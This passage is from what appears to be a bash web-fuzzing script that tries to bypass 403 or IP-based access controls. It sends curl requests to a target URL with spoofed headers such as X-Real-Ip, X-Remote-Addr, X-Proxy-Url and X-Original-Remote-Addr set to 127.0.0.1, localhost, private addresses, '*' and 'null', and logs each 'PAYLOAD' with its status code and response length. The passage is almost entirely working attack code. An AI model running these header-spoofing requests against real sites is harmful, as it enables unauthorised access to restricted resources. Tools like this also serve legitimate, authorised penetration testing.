	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Original-Remote-Addr Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Original-Remote-Addr: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Proxy-Url Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Proxy-Url Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Proxy-Url: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Real-Ip Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Real-Ip Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Real-Ip: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-Remote-Addr Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "X-Remote-Addr Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'X-Remote-Addr: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "X-OReferrer Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
